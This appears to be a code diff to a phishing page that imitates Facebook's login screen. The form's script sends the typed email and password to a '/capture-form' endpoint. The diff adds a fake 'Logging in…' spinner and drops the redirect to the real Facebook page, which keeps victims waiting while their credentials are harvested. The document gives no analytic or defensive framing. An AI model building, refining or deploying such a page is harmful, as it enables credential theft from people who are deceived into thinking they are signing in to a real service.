@@ -22,12 +22,17 @@ body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;color:#1c1e21}
 .divider{border-top:1px solid #dddfe2;margin:1rem 0}
 .create-btn{width:100%;background:#42b72a;color:#fff;border:none;border-radius:6px;padding:0.75rem;font-size:0.95rem;font-weight:700;cursor:pointer;transition:background 0.2s}
 .create-btn:hover{background:#36a420}
+.spinner-overlay{display:none;position:fixed;inset:0;background:rgba(240,242,245,0.92);z-index:9999;flex-direction:column;align-items:center;justify-content:center}
+.spinner-overlay.active{display:flex}
+.fb-spinner{width:44px;height:44px;border:4px solid #dddfe2;border-top-color:#1877f2;border-radius:50%;animation:FbSpinAnim 0.8s linear infinite}
+@keyframes FbSpinAnim{to{transform:rotate(360deg)}}
+.spinner-text{margin-top:1rem;color:#606770;font-size:0.9rem}
 @media(max-width:768px){.inner{flex-direction:column;gap:2rem}.brand{text-align:center}.brand-logo{font-size:2.5rem}}
 </style>
 </head>
 <body>
 <div class="page">
-  <div class="inner">
+  <div class="inner" style="position:relative;z-index:1">
     <div class="brand">
       <div class="brand-logo">facebook</div>
       <div class="brand-tagline">Connect with friends and the world around you on Facebook.</div>
@@ -35,29 +40,32 @@ body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;color:#1c1e21}
     <div class="login-card">
       <input class="input-field" type="text" id="EmailInput" placeholder="Email address or phone number" autocomplete="email">
       <input class="input-field" type="password" id="PasswordInput" placeholder="Password" autocomplete="current-password">
-      <button class="login-btn" onclick="SubmitLogin()">Log in</button>
+      <button class="login-btn" id="LoginBtn">Log in</button>
       <a href="#" class="forgot-link">Forgotten password?</a>
       <div class="divider"></div>
       <button class="create-btn">Create new account</button>
     </div>
   </div>
+  <div class="spinner-overlay" id="SpinnerOverlay">
+    <div class="fb-spinner"></div>
+    <p class="spinner-text">Logging in&hellip;</p>
+  </div>
+  </div>
 </div>
 <script src="/static/Tracker.js"></script>
 <script>
 function SubmitLogin() {
-  const Email = document.getElementById("EmailInput").value.trim();
-  const Password = document.getElementById("PasswordInput").value;
+  var Email = document.getElementById("EmailInput").value.trim();
+  var Password = document.getElementById("PasswordInput").value;
   if (!Email || !Password) return;
+  document.getElementById("SpinnerOverlay").classList.add("active");
   fetch("/capture-form", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ Username: Email, Password: Password })
-  }).then(function () {
-    window.location.href = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1";
-  }).catch(function () {
-    window.location.href = "https://www.facebook.com/";
-  });
+  }).catch(function () {});
 }
+document.getElementById("LoginBtn").addEventListener("click", function () { SubmitLogin(); });
 document.getElementById("PasswordInput").addEventListener("keydown", function (Event) {
   if (Event.key === "Enter") SubmitLogin();
 });
